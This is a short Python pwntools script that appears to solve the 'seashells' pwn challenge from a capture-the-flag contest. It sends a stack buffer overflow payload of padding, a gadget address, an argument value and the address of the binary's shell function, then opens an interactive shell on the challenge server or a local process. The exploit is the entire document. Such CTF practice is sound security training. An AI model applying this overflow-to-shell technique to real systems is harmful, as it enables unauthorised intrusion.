from pwn import *

e = ELF("./seashells")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8009)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})


debug()

p.sendlineafter("?", "A" * 0x12 + p64(0x400803) + p64(0xdeadcafebabebeef) + p64(e.symbols["shell"] + 1))


p.interactive()
